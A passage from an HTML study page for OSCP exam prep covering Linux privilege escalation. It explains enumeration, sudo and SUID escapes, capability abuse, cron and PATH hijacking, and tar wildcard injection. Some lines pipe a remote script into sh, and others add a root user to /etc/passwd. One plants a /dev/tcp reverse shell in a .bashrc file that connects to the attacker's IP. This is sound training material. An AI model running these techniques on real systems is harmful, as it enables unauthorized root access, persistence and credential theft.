@@ -1,0 +1,510 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Privilege Escalation · OSCP+ KB</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#0a0d12; --panel:#11161d; --panel2:#161c24; --hover:#1b2531;
+  --text:#c9d3de; --head:#e8eef5; --muted:#7d8794; --faint:#5a6472;
+  --accent:#4f9cf9; --accent-soft:#1a2942; --accent2:#e3a008;
+  --border:#20262e; --border2:#2a323c;
+  --code-bg:#0a0e13; --code-text:#c9d3de;
+  --tag-bg:#0f2a1c; --tag-text:#56d364; --tag-bd:#1c3f2a;
+  --hl:#7a5c00; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(0,0,0,.4);
+}
+html[data-theme="light"]{
+  --bg:#ffffff; --bg2:#f6f8fa; --panel:#f6f8fa; --panel2:#eef1f4; --hover:#e7ecf1;
+  --text:#24292f; --head:#0f1419; --muted:#57606a; --faint:#8b949e;
+  --accent:#0969da; --accent-soft:#ddf0ff; --accent2:#9a6700;
+  --border:#d8dee4; --border2:#cdd5dd;
+  --code-bg:#f2f4f7; --code-text:#24292f;
+  --tag-bg:#e6f7ec; --tag-text:#1a7f37; --tag-bd:#c3ead0;
+  --hl:#fff3b0; --hl-cur:#e3a008;
+  --shadow:0 1px 3px rgba(140,149,159,.25);
+}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;background:var(--bg);color:var(--text);
+  font:15.5px/1.68 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  -webkit-font-smoothing:antialiased;}
+a{color:var(--accent);text-decoration:none}
+a:hover{text-decoration:underline}
+::selection{background:var(--accent-soft)}
+
+#layout{display:flex;min-height:100vh}
+
+/* ---------- Sidebar ---------- */
+#sidebar{width:300px;flex:0 0 300px;background:var(--panel);border-right:1px solid var(--border);
+  height:100vh;position:sticky;top:0;display:flex;flex-direction:column}
+#brand{padding:18px 18px 12px}
+#brand .logo{font-size:15px;font-weight:700;color:var(--head);letter-spacing:.2px;display:flex;align-items:center;gap:8px}
+#brand .tagline{color:var(--faint);font-size:11.5px;margin-top:3px;letter-spacing:.3px}
+#navfilterwrap{padding:0 14px 12px;border-bottom:1px solid var(--border)}
+#navfilter{width:100%;padding:9px 12px;background:var(--bg2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:13px;outline:none}
+#navfilter:focus{border-color:var(--accent)}
+#navtools{display:flex;gap:6px;padding:10px 14px 4px}
+#navtools button{flex:1;background:none;border:1px solid var(--border2);color:var(--muted);
+  border-radius:7px;padding:5px 6px;cursor:pointer;font-size:11px}
+#navtools button:hover{color:var(--text);border-color:var(--accent)}
+#nav{overflow-y:auto;padding:6px 8px 60px;flex:1}
+#nav::-webkit-scrollbar{width:9px}#nav::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+.navgroup{margin-bottom:1px}
+.navvol{width:100%;text-align:left;background:none;border:none;color:var(--head);
+  font-weight:600;font-size:12.5px;padding:8px 8px;cursor:pointer;border-radius:7px;
+  display:flex;gap:7px;align-items:center;line-height:1.35}
+.navvol:hover{background:var(--hover)}
+.navvol .tw{color:var(--faint);font-size:10px;transition:transform .15s;flex:0 0 10px}
+.navgroup.collapsed .tw{transform:rotate(-90deg)}
+.navgroup.collapsed .navitems{display:none}
+.navitems{display:flex;flex-direction:column;padding:1px 0 8px 3px;margin-left:8px;
+  border-left:1px solid var(--border)}
+.navlink{color:var(--muted);font-size:12px;padding:4px 10px;border-radius:6px;white-space:nowrap;
+  overflow:hidden;text-overflow:ellipsis;border-left:2px solid transparent;margin-left:-1px}
+.navlink:hover{background:var(--hover);color:var(--text);text-decoration:none}
+.navlink.lvl1{color:var(--head);font-weight:700;margin-top:11px;font-size:12.5px}
+.navlink.lvl1:first-child{margin-top:2px}
+.navlink.lvl2{padding-left:22px;font-size:11.5px;color:var(--muted);border-left:1px solid var(--border)}
+.navlink.lvl2:hover,.navlink.lvl2.active{border-left-color:var(--accent)}
+.navlink.active{background:var(--accent-soft);color:var(--accent);border-left-color:var(--accent)}
+
+/* ---------- Main ---------- */
+#main{flex:1;min-width:0;display:flex;flex-direction:column;background:var(--bg)}
+#topbar{position:sticky;top:0;z-index:20;background:color-mix(in srgb,var(--bg) 88%,transparent);
+  backdrop-filter:saturate(1.4) blur(8px);border-bottom:1px solid var(--border);
+  padding:11px 26px;display:flex;gap:12px;align-items:center}
+#searchwrap{position:relative;flex:1;max-width:620px}
+#searchwrap .ic{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:var(--faint);font-size:14px}
+#search{width:100%;padding:9px 12px 9px 34px;background:var(--panel2);border:1px solid var(--border2);
+  color:var(--text);border-radius:9px;font-size:14px;outline:none}
+#search:focus{border-color:var(--accent);background:var(--bg2)}
+#count{color:var(--muted);font-size:12px;min-width:64px;text-align:right;font-variant-numeric:tabular-nums}
+.iconbtn{background:var(--panel2);color:var(--muted);border:1px solid var(--border2);
+  border-radius:9px;width:38px;height:38px;cursor:pointer;font-size:15px;display:inline-flex;
+  align-items:center;justify-content:center}
+.iconbtn:hover{color:var(--text);border-color:var(--accent)}
+
+#content{padding:34px 44px 140px;max-width:860px;margin:0 auto;width:100%}
+#content h1{font-size:23px;font-weight:700;color:var(--head);letter-spacing:-.2px;
+  margin:8px 0 18px;padding-bottom:12px;border-bottom:1px solid var(--border);line-height:1.3}
+.vol + .vol h1, #content h1.volstart{margin-top:56px}
+.volkicker{font-size:10.5px;font-weight:700;letter-spacing:1.4px;color:var(--faint);text-transform:uppercase;
+  margin:58px 0 4px;padding-top:22px;border-top:1px solid var(--border)}
+.vol:first-child .volkicker{margin-top:4px;border-top:none;padding-top:0}
+#content h2{font-size:18px;font-weight:650;color:var(--head);margin:34px 0 10px;
+  padding-left:11px;border-left:3px solid var(--accent);line-height:1.35}
+#content h3{font-size:15px;font-weight:650;color:var(--accent2);margin:24px 0 8px}
+#content h4{font-size:13.5px;font-weight:650;color:var(--head);margin:16px 0 6px;
+  text-transform:uppercase;letter-spacing:.4px}
+.vol{scroll-margin-top:66px}
+#content h1,#content h2,#content h3,#content h4{scroll-margin-top:70px;position:relative}
+.anchor{opacity:0;margin-left:8px;color:var(--faint);font-weight:400;font-size:.75em}
+h1:hover .anchor,h2:hover .anchor,h3:hover .anchor{opacity:1}
+#content p{margin:9px 0}
+#content ul,#content ol{margin:9px 0;padding-left:24px}
+#content li{margin:4px 0}
+#content li::marker{color:var(--faint)}
+
+/* inline code + tag pills */
+code{background:var(--code-bg);color:var(--code-text);padding:1px 5px;border-radius:5px;
+  font:12.5px/1.45 "SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+  border:1px solid var(--border);white-space:nowrap}
+code.tag{background:var(--tag-bg);color:var(--tag-text);border:1px solid var(--tag-bd);
+  font-weight:600;letter-spacing:.2px;cursor:pointer}
+code.tag:hover{filter:brightness(1.15)}
+
+pre{background:var(--code-bg);border:1px solid var(--border);border-radius:11px;padding:14px 16px;
+  overflow:auto;margin:14px 0;box-shadow:var(--shadow)}
+pre code{background:none;border:none;padding:0;color:var(--code-text);white-space:pre;
+  font-size:12.5px;line-height:1.55}
+pre::-webkit-scrollbar{height:9px}pre::-webkit-scrollbar-thumb{background:var(--border2);border-radius:6px}
+
+blockquote{border-left:3px solid var(--accent2);background:var(--panel);margin:14px 0;
+  padding:11px 16px;border-radius:0 9px 9px 0;color:var(--muted);font-size:14.5px}
+blockquote strong{color:var(--head)}
+
+.tablewrap{overflow-x:auto;margin:14px 0;border:1px solid var(--border);border-radius:10px;box-shadow:var(--shadow)}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border-bottom:1px solid var(--border);border-right:1px solid var(--border);padding:8px 12px;text-align:left;vertical-align:top}
+tr td:last-child,tr th:last-child{border-right:none}
+tbody tr:last-child td{border-bottom:none}
+th{background:var(--panel2);font-weight:650;color:var(--head)}
+tbody tr:nth-child(even){background:var(--bg2)}
+tbody tr:hover{background:var(--hover)}
+
+hr{border:none;border-top:1px solid var(--border);margin:30px 0}
+mark{background:var(--hl);color:var(--head);padding:0 1px;border-radius:2px}
+mark.current{background:var(--hl-cur);color:#111;box-shadow:0 0 0 2px var(--hl-cur)}
+
+#totop{position:fixed;right:26px;bottom:26px;z-index:30;background:var(--accent);color:#fff;border:none;
+  width:42px;height:42px;border-radius:11px;font-size:17px;cursor:pointer;display:none;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+#menuBtn{display:none}
+
+@media(max-width:900px){
+  #sidebar{position:fixed;z-index:50;left:-320px;transition:left .2s;box-shadow:6px 0 24px rgba(0,0,0,.5)}
+  #sidebar.open{left:0}
+  #menuBtn{display:inline-flex}
+  #content{padding:20px 18px 120px}
+  #topbar{padding:10px 14px}
+}
+</style>
+</head>
+<body>
+<div id="layout">
+  <aside id="sidebar">
+    <div id="brand">
+      <a href="index.html" style="text-decoration:none"><div class="logo">⬆️ Privilege Escalation</div></a>
+      <a href="index.html" class="tagline" style="display:inline-block;margin-top:4px">← all sections</a>
+    </div>
+    <div id="navfilterwrap"><input id="navfilter" placeholder="Filter this section…"></div>
+    <nav id="nav"><div class="navitems"><a class="navlink lvl1" href="#v6-[linux-privesc]-getting-root-on-linux">[LINUX-PRIVESC]  getting root on Linux</a><a class="navlink lvl2" href="#v6-[linux-privesc-quick]-first-60-seconds-on-any-linux-shell-one-screen">[LINUX-PRIVESC-QUICK]  first 60 seconds on any Linux shell  (one screen)</a><a class="navlink lvl2" href="#v6-[linpeas-workflow]-using-the-automated-enumerator">[LINPEAS-WORKFLOW]  using the automated enumerator</a><a class="navlink lvl2" href="#v6-[gtfobins-workflow]-how-to-actually-use-gtfobins">[GTFOBINS-WORKFLOW]  how to actually use GTFOBins</a><a class="navlink lvl2" href="#v6-[linux-sudo]-abusing-sudo-rights">[LINUX-SUDO]  abusing sudo rights</a><a class="navlink lvl2" href="#v6-[linux-suid]-sgid-abusing-suid-programs">[LINUX-SUID] / SGID  abusing SUID programs</a><a class="navlink lvl2" href="#v6-[linux-cap]-linux-capabilities">[LINUX-CAP]  Linux capabilities</a><a class="navlink lvl2" href="#v6-[linux-cron]-scheduled-jobs-cron">[LINUX-CRON]  scheduled jobs (cron)</a><a class="navlink lvl2" href="#v6-[linux-path]-path-hijacking">[LINUX-PATH]  PATH hijacking</a><a class="navlink lvl2" href="#v6-[linux-wildcard]-wildcard-injection">[LINUX-WILDCARD]  wildcard injection</a><a class="navlink lvl2" href="#v6-[linux-writable]-writable-sensitive-files">[LINUX-WRITABLE]  writable sensitive files</a><a class="navlink lvl2" href="#v6-[linux-bashrc]-writable-shell-startup-files">[LINUX-BASHRC]  writable shell-startup files</a><a class="navlink lvl2" href="#v6-[linux-systemd]-services-timers">[LINUX-SYSTEMD]  services / timers</a><a class="navlink lvl2" href="#v6-[linux-nfs]-no-root-squash">[LINUX-NFS]  no_root_squash</a><a class="navlink lvl2" href="#v6-[linux-docker-lxd]-container-group-escapes">[LINUX-DOCKER-LXD]  container / group escapes</a><a class="navlink lvl2" href="#v6-[linux-creds]-hunting-creds-keys-also-[credentials-sources]">[LINUX-CREDS]  hunting creds &amp; keys (also [CREDENTIALS-SOURCES])</a><a class="navlink lvl2" href="#v6-[linux-kernel]-kernel-exploits-last-resort">[LINUX-KERNEL]  kernel exploits (LAST resort)</a><a class="navlink lvl2" href="#v6-[linux-local-enum]-check-x-run-this-table-copy-paste-after-you-get-a-shell">[LINUX-LOCAL-ENUM]  &quot;check X → run this&quot; table (copy-paste after you get a shell)</a><a class="navlink lvl2" href="#v6-[linux-privesc-manual]-full-manual-checklist-when-linpeas-is-unavailable-or-misses-it">[LINUX-PRIVESC-MANUAL]  full manual checklist (when linpeas is unavailable or misses it)</a><a class="navlink lvl1" href="#v6-[windows-privesc]-getting-system-on-windows">[WINDOWS-PRIVESC]  getting SYSTEM on Windows</a><a class="navlink lvl2" href="#v6-[windows-privesc-quick]-first-60-seconds-on-any-windows-shell-one-screen">[WINDOWS-PRIVESC-QUICK]  first 60 seconds on any Windows shell  (one screen)</a><a class="navlink lvl2" href="#v6-[winpeas-workflow]">[WINPEAS-WORKFLOW]</a><a class="navlink lvl2" href="#v6-[windows-tokens]-abusing-privileges-the-fastest-wins-[tech-tokens]">[WINDOWS-TOKENS]  abusing privileges (the fastest wins)  → [TECH-TOKENS]</a><a class="navlink lvl2" href="#v6-[windows-services]-service-misconfigurations">[WINDOWS-SERVICES]  service misconfigurations</a><a class="navlink lvl2" href="#v6-[windows-registry]-registry-based">[WINDOWS-REGISTRY]  registry-based</a><a class="navlink lvl2" href="#v6-[windows-creds]-credential-hunting-[credentials-sources]">[WINDOWS-CREDS]  credential hunting  → [CREDENTIALS-SOURCES]</a><a class="navlink lvl2" href="#v6-[windows-startup]-startup-scheduled-tasks">[WINDOWS-STARTUP]  startup / scheduled tasks</a><a class="navlink lvl2" href="#v6-[windows-installed]-installed-software-find-a-vulnerable-app">[WINDOWS-INSTALLED]  installed software (find a vulnerable app)</a><a class="navlink lvl2" href="#v6-[windows-processes]-running-processes-find-the-non-standard-one">[WINDOWS-PROCESSES]  running processes — find the non-standard one</a><a class="navlink lvl2" href="#v6-[windows-kernel]-kernelos-exploits-last-resort">[WINDOWS-KERNEL]  kernel/OS exploits (LAST resort)</a><a class="navlink lvl2" href="#v6-[powershell]-the-windows-powershell-commands-you-actually-type">[POWERSHELL]  ⚡ the Windows PowerShell commands you actually type</a><a class="navlink lvl2" href="#v6-[win-local-enum]-check-x-run-this-table-copy-paste-after-you-get-a-shell">[WIN-LOCAL-ENUM]  &quot;check X → run this&quot; table (copy-paste after you get a shell)</a><a class="navlink lvl2" href="#v6-[windows-privesc-manual]-checklist">[WINDOWS-PRIVESC-MANUAL]  checklist</a></div></nav>
+  </aside>
+  <div id="main">
+    <div id="topbar">
+      <button id="menuBtn" class="iconbtn" onclick="document.getElementById('sidebar').classList.toggle('open')">☰</button>
+      <a class="iconbtn" href="index.html" title="All sections">≡</a>
+      <div id="searchwrap"><span class="ic">🔎</span><input id="search" placeholder="Search this section…   Enter ↵ next"></div>
+      <span id="count"></span>
+      <button class="iconbtn" onclick="clearSearch()" title="Clear">✕</button>
+      <button class="iconbtn" onclick="toggleTheme()" title="Theme">◐</button>
+    </div>
+    <main id="content"><section class="vol"><div class="volkicker" id="v6-oscp-knowledge-base-volume-4">OSCP+ KNOWLEDGE BASE — VOLUME 4</div>
+<h2 id="v6-becoming-root-system-privilege-escalation-linux-windows">BECOMING ROOT / SYSTEM: PRIVILEGE ESCALATION (Linux &amp; Windows)<a class="anchor" href="#v6-becoming-root-system-privilege-escalation-linux-windows">#</a></h2>
+<blockquote><strong>Read this box first.</strong> &quot;Privilege escalation&quot; (&quot;privesc&quot;) = you have a shell as a *normal* user, and you want to become the *all-powerful* user. On <strong>Linux</strong> that top user is <strong>root</strong>. On <strong>Windows</strong> it&#x27;s <strong>SYSTEM</strong> (or a local Administrator). The final flag (<code>proof.txt</code>) almost always requires it.  <strong>The mindset:</strong> you don&#x27;t &quot;hack&quot; your way to root — you find something the admin *misconfigured* (a program you&#x27;re allowed to run as root, a script root runs that you can edit, a password left in a file) and abuse it. So privesc = <strong>enumerate thoroughly, then spot the one thing that&#x27;s wrong.</strong>  <strong>Two best friends:</strong> - <strong>GTFOBins</strong> (gtfobins.github.io) — for Linux: look up any program you&#x27;re allowed to run elevated; it tells you the exact escape. - <strong>LOLBAS</strong> (lolbas-project.github.io) — the Windows equivalent.  Placeholders: <code>&lt;IP&gt;</code> = <strong>your Kali</strong> IP (for reverse shells / file serving). <code>$IP</code> = the target. <code>&lt;you&gt;</code> = your current username on the target.</blockquote>
+<hr>
+<h1 id="v6-[linux-privesc]-getting-root-on-linux">[LINUX-PRIVESC]  getting root on Linux<a class="anchor" href="#v6-[linux-privesc]-getting-root-on-linux">#</a></h1>
+<h2 id="v6-[linux-privesc-quick]-first-60-seconds-on-any-linux-shell-one-screen">[LINUX-PRIVESC-QUICK]  first 60 seconds on any Linux shell  (one screen)<a class="anchor" href="#v6-[linux-privesc-quick]-first-60-seconds-on-any-linux-shell-one-screen">#</a></h2>
+<pre><code>id ; sudo -l ; hostname ; uname -a                    # [MUST-MEMORIZE] who am I, what can I sudo, which kernel
+#   id      = your user + groups (are you in &#x27;sudo&#x27;, &#x27;docker&#x27;, &#x27;lxd&#x27;? those are shortcuts to root)
+#   sudo -l = what you&#x27;re allowed to run as root (the #1 quick win — check this FIRST)
+#   uname -a= kernel version (only for kernel exploits, which are a LAST resort)
+find / -perm -4000 -type f 2&gt;/dev/null                # find &quot;SUID&quot; programs (run as their owner — often root)
+find / -writable -type d 2&gt;/dev/null | head           # folders you can write to
+cat /etc/crontab ; ls -la /etc/cron.*                 # scheduled jobs (a root job you can tamper with = win)
+getcap -r / 2&gt;/dev/null                               # &quot;capabilities&quot; (special powers on specific programs)
+ls -la /home/* ; cat ~/.bash_history ; ls -la ~/.ssh  # loot: other users, past commands, SSH keys
+ss -tlnp ; cat /etc/passwd                            # internal-only services + the user list
+# then let a script do the heavy lifting:
+./linpeas.sh | tee linpeas.txt</code></pre>
+<p><strong>Check these in order (easiest wins first):</strong> <code>sudo -l</code> → SUID/GTFOBins → a writable cron/script → capabilities → creds in files → <strong>kernel exploit (only as a last resort — it can crash the box)</strong>.</p>
+<h2 id="v6-[linpeas-workflow]-using-the-automated-enumerator">[LINPEAS-WORKFLOW]  using the automated enumerator<a class="anchor" href="#v6-[linpeas-workflow]-using-the-automated-enumerator">#</a></h2>
+<ol>
+<li>Get it onto the target and run it: <code>curl http://&lt;IP&gt;/linpeas.sh | sh</code>, or download it, <code>chmod +x linpeas.sh</code>, <code>./linpeas.sh</code>. Save the output with <code>| tee linpeas.txt</code>.</li>
+<li><strong>Read the RED/YELLOW highlights first</strong> — RED+YELLOW together = &quot;this is very likely your way up.&quot;</li>
+<li><strong>Don&#x27;t trust it blindly</strong> — linpeas misses things and also flags harmless noise. Confirm each candidate by hand before exploiting.</li>
+<li>Prioritise these sections: &quot;Interesting writable files&quot;, &quot;SUID&quot;, &quot;Sudo&quot;, &quot;Capabilities&quot;, &quot;Cron&quot;, &quot;Passwords/creds&quot;, &quot;Software with known exploits&quot;.</li>
+<li>**Quieter alternative — <code>lse.sh</code> (linux-smart-enumeration):** if linpeas is overwhelming, run <code>./lse.sh -l1</code> (only interesting findings) then <code>-l2</code> (everything). It&#x27;s also read-only and exam-legal — a good second opinion.</li>
+</ol>
+<h2 id="v6-[gtfobins-workflow]-how-to-actually-use-gtfobins">[GTFOBINS-WORKFLOW]  how to actually use GTFOBins<a class="anchor" href="#v6-[gtfobins-workflow]-how-to-actually-use-gtfobins">#</a></h2>
+<ul>
+<li>Any program that shows up in <code>sudo -l</code>, or as a SUID binary, or with a capability → look its name up on <strong>GTFOBins</strong>.</li>
+<li>Pick the section that matches *your* case — <strong>Sudo</strong>, <strong>SUID</strong>, or <strong>Capabilities</strong> — and copy the exact escape it gives.</li>
+<li>The mental test: does this program let me <strong>run a command</strong>, <strong>read a file</strong>, <strong>write a file</strong>, or <strong>spawn a shell</strong> as the elevated user? If any of those → you win.</li>
+</ul>
+<h2 id="v6-[linux-sudo]-abusing-sudo-rights">[LINUX-SUDO]  abusing <code>sudo</code> rights<a class="anchor" href="#v6-[linux-sudo]-abusing-sudo-rights">#</a></h2>
+<p><strong>What it is:</strong> <code>sudo</code> lets you run specific commands as root. If you&#x27;re allowed to run the *wrong* command, you can turn it into a full root shell.</p>
+<p><strong>Detect:</strong> <code>sudo -l</code>.</p>
+<p><strong>Read the output:</strong> <code>(ALL) NOPASSWD: /path/bin</code> = you can run that as root with no password. <code>(root) ALL</code> = full root already. <code>env_keep</code>/<code>LD_PRELOAD</code> present = an environment-hijack trick is possible. If it&#x27;s a <strong>script you can edit</strong> = instant win.</p>
+<p><strong>Exploit:</strong></p>
+<ul>
+<li>Look the allowed program up on <strong>GTFOBins</strong> (Sudo section). Examples: <code>sudo find . -exec /bin/sh \; -quit</code> · <code>sudo vim -c &#x27;:!/bin/sh&#x27;</code> · <code>sudo less</code> then <code>!sh</code> · <code>sudo awk &#x27;BEGIN{system(&quot;/bin/sh&quot;)}&#x27;</code> · <code>sudo env /bin/sh</code>.</li>
+<li><code>(ALL) NOPASSWD: /usr/bin/python3</code> → <code>sudo python3 -c &#x27;import os;os.system(&quot;/bin/sh&quot;)&#x27;</code>.</li>
+<li><strong>LD_PRELOAD</strong> (when <code>env_keep+=LD_PRELOAD</code> is set): compile a tiny malicious <code>.so</code> library whose startup code spawns a shell → <code>sudo LD_PRELOAD=/tmp/x.so &lt;allowed cmd&gt;</code>.</li>
+<li>An editable script that runs as root → insert a reverse shell, or <code>cp /bin/bash /tmp/rb; chmod +s /tmp/rb</code>.</li>
+<li>Specific vulnerable sudo versions: <strong>CVE-2021-3156 (Baron Samedit)</strong>, **CVE-2019-14287 (<code>sudo -u#-1</code>)** <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<p><strong>Verify:</strong> <code>id</code> shows <code>uid=0(root)</code>, or run <code>bash -p</code> after making a SUID bash.</p>
+<p><strong>Not a vector if:</strong> the allowed program has no GTFOBins escape and no input you can tamper with.</p>
+<h2 id="v6-[linux-suid]-sgid-abusing-suid-programs">[LINUX-SUID] / SGID  abusing SUID programs<a class="anchor" href="#v6-[linux-suid]-sgid-abusing-suid-programs">#</a></h2>
+<p><strong>What it is:</strong> a &quot;SUID&quot; program always runs as its *owner*, no matter who launches it. If a root-owned SUID program can be made to run your commands, you become root.</p>
+<p><strong>Detect:</strong> <code>find / -perm -4000 -type f 2&gt;/dev/null</code> (SUID); use <code>-2000</code> for SGID.</p>
+<p><strong>Read it:</strong> ignore the normal ones (<code>ping</code>, <code>su</code>, <code>sudo</code>, <code>mount</code>, <code>passwd</code>, <code>pkexec</code>) — look for <strong>unusual</strong> or <strong>custom</strong> programs, and known tools that have a GTFOBins entry.</p>
+<p><strong>Exploit:</strong></p>
+<ul>
+<li>GTFOBins SUID section (e.g. <code>find</code>, old <code>nmap --interactive</code>, <code>bash -p</code>, <code>cp</code>, <code>env</code>, <code>python</code> if it&#x27;s SUID).</li>
+<li><strong>A custom SUID binary:</strong> run <code>strings</code> / <code>ltrace</code> on it — it often calls another program <strong>without a full path</strong> → hijack it via PATH (<code class="tag">[LINUX-PATH]</code>), or it calls <code>system(&quot;service …&quot;)</code> → hijack that.</li>
+<li><code>pkexec</code> present → <strong>PwnKit / CVE-2021-4034</strong> (extremely common on older boxes) <code class="tag">[LOOK-UP]</code>.</li>
+</ul>
+<p><strong>Verify:</strong> <code>bash -p</code> (the <code>-p</code> keeps the elevated privileges) then <code>id</code>.</p>
+<p><strong>Not a vector if:</strong> the binary drops its privileges internally or has nothing you can influence.</p>
+<h2 id="v6-[linux-cap]-linux-capabilities">[LINUX-CAP]  Linux capabilities<a class="anchor" href="#v6-[linux-cap]-linux-capabilities">#</a></h2>
+<p><strong>What it is:</strong> &quot;capabilities&quot; are slivers of root power granted to a single program. The dangerous ones let a program change its user ID or read/write any file.</p>
+<p><strong>Detect:</strong> <code>getcap -r / 2&gt;/dev/null</code>.</p>
+<p><strong>Read it:</strong> <code>cap_setuid+ep</code> on python/perl = instant root. <code>cap_dac_read_search</code> = read any file (e.g. <code>/etc/shadow</code>). <code>cap_dac_override</code> = write any file.</p>
+<p>**Exploit (<code>cap_setuid</code> → root):**</p>
+<pre><code>python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/bash&quot;)&#x27;              # if python has cap_setuid
+perl -e &#x27;use POSIX qw(setuid); POSIX::setuid(0); exec &quot;/bin/bash&quot;;&#x27;     # if perl does
+gdb -nx -ex &#x27;python import os; os.setuid(0)&#x27; -ex &#x27;!sh&#x27; -ex quit         # if gdb does
+# cap_dac_read_search → read /etc/shadow with that binary → crack root&#x27;s hash
+# cap_dac_override    → overwrite /etc/passwd, a root cron, or sudoers</code></pre>
+<p><strong>Verify:</strong> <code>id</code> → <code>uid=0(root)</code>. Only <code>cap_setuid</code>/<code>cap_setgid</code>/<code>cap_dac_*</code> on a program that <strong>runs code</strong> (python/perl/gdb/ruby) are exploitable; things like <code>cap_net_raw</code> on <code>ping</code> are not. Look up the exact command on <strong>GTFOBins → Capabilities</strong>.</p>
+<h2 id="v6-[linux-cron]-scheduled-jobs-cron">[LINUX-CRON]  scheduled jobs (cron)<a class="anchor" href="#v6-[linux-cron]-scheduled-jobs-cron">#</a></h2>
+<p><strong>What it is:</strong> the system runs certain scripts on a schedule, often as root. If you can edit a script root runs — or write into a folder it uses — your code runs as root.</p>
+<p><strong>Detect:</strong> <code>cat /etc/crontab</code>; <code>ls -la /etc/cron.d /etc/cron.daily</code>; run **<code>pspy</code>** to watch processes live and catch hidden or short-interval jobs.</p>
+<p><strong>Read it:</strong> a script that runs <strong>as root</strong> and is <strong>writable by you</strong> (or lives in a writable folder, or uses a <code>*</code> wildcard, or calls a program by short name) = win.</p>
+<p><strong>Exploit:</strong></p>
+<ul>
+<li>Writable script → append a reverse shell, or <code>cp /bin/bash /tmp/rb; chmod +s /tmp/rb</code>.</li>
+<li><strong>Wildcard injection</strong> (a job like <code>tar/chown/rsync *</code> in a folder you can write to): drop files whose *names* are command options — see <code class="tag">[LINUX-WILDCARD]</code>.</li>
+<li>Calls a program by short name → PATH hijack (<code class="tag">[LINUX-PATH]</code>).</li>
+</ul>
+<p><strong>Verify:</strong> wait for the interval; catch the shell / use the SUID bash. <strong>Troubleshoot:</strong> confirm it actually runs (<code>pspy</code>), and that you can write both the *script* and its *folder*.</p>
+<h2 id="v6-[linux-path]-path-hijacking">[LINUX-PATH]  PATH hijacking<a class="anchor" href="#v6-[linux-path]-path-hijacking">#</a></h2>
+<p><strong>What it is:</strong> if a privileged program calls another command by its short name (<code>service</code> instead of <code>/usr/sbin/service</code>), Linux searches folders in your <code>$PATH</code> to find it. Put a fake one earlier in the PATH and yours runs instead.</p>
+<p><strong>Detect:</strong> a SUID/cron/sudo program calls another command by name (find out via <code>strings</code> / <code>ltrace -f ./bin</code>).</p>
+<p><strong>Exploit:</strong> <code>echo &#x27;/bin/bash -p&#x27; &gt; /tmp/service; chmod +x /tmp/service; export PATH=/tmp:$PATH</code>, then trigger the parent program.</p>
+<p><strong>Verify:</strong> the parent runs your fake as root.</p>
+<h2 id="v6-[linux-wildcard]-wildcard-injection">[LINUX-WILDCARD]  wildcard injection<a class="anchor" href="#v6-[linux-wildcard]-wildcard-injection">#</a></h2>
+<p>A cron/script runs <code>tar czf backup.tar.gz *</code> (or <code>chown *</code>, <code>rsync *</code>) in a folder you can write to. Because <code>*</code> expands to the filenames, you plant files whose names are actually command-line options:</p>
+<pre><code>cd &lt;dir&gt;
+echo &#x27;cp /bin/bash /tmp/rb; chmod +s /tmp/rb&#x27; &gt; x.sh
+touch -- &#x27;--checkpoint=1&#x27;
+touch -- &#x27;--checkpoint-action=exec=sh x.sh&#x27;      # next tar run executes x.sh as root → SUID bash</code></pre>
+<h2 id="v6-[linux-writable]-writable-sensitive-files">[LINUX-WRITABLE]  writable sensitive files<a class="anchor" href="#v6-[linux-writable]-writable-sensitive-files">#</a></h2>
+<ul>
+<li>Writable <code>/etc/passwd</code> → add your own root user:</li>
+</ul>
+<p>  <code>echo &#x27;r00t:$(openssl passwd -1 -salt a pass):0:0::/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</code> then <code>su r00t</code> (password: <code>pass</code>).</p>
+<ul>
+<li>Writable <code>/etc/shadow</code> → replace root&#x27;s hash with one you know. Writable <code>/etc/sudoers</code> (or <code>sudoers.d</code>) → grant yourself NOPASSWD. Writable systemd service/unit → root via systemd.</li>
+</ul>
+<h2 id="v6-[linux-bashrc]-writable-shell-startup-files">[LINUX-BASHRC]  writable shell-startup files<a class="anchor" href="#v6-[linux-bashrc]-writable-shell-startup-files">#</a></h2>
+<p><strong>What it is:</strong> files like <code>~/.bashrc</code>, <code>~/.bash_profile</code>, <code>~/.profile</code> (and global ones in <code>/etc/profile.d/</code>) run <strong>every time that user opens a shell</strong>. If one belongs to a higher-priv user but is <strong>writable by you</strong>, append a payload and it fires as *them* next time they log in.</p>
+<pre><code>find / \( -name &quot;.bashrc&quot; -o -name &quot;.bash_profile&quot; -o -name &quot;.profile&quot; \) -writable 2&gt;/dev/null
+ls -la /etc/profile /etc/bash.bashrc /etc/profile.d/
+# if root&#x27;s file is writable:
+echo &#x27;cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash&#x27; &gt;&gt; /root/.bashrc   # then, after root logs in:  /tmp/rootbash -p
+echo &#x27;bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/443 0&gt;&amp;1&#x27; &gt;&gt; /home/&lt;user&gt;/.bashrc              # reverse shell as that user</code></pre>
+<p><strong>Also loot</strong> your own and others&#x27; <code>.bashrc</code>/<code>.profile</code> for aliases and <code>export</code>ed credentials. (Different from <code>~/.bash_history</code>, which is *reading* past commands for creds — <code class="tag">[LINUX-CREDS]</code>.)</p>
+<h2 id="v6-[linux-systemd]-services-timers">[LINUX-SYSTEMD]  services / timers<a class="anchor" href="#v6-[linux-systemd]-services-timers">#</a></h2>
+<p>A writable <code>.service</code> or <code>.timer</code> file, or a root service that points to a binary you can overwrite → edit <code>ExecStart</code> to your payload, then <code>systemctl restart &lt;svc&gt;</code> (if allowed) or wait for the timer.</p>
+<h2 id="v6-[linux-nfs]-no-root-squash">[LINUX-NFS]  no_root_squash<a class="anchor" href="#v6-[linux-nfs]-no-root-squash">#</a></h2>
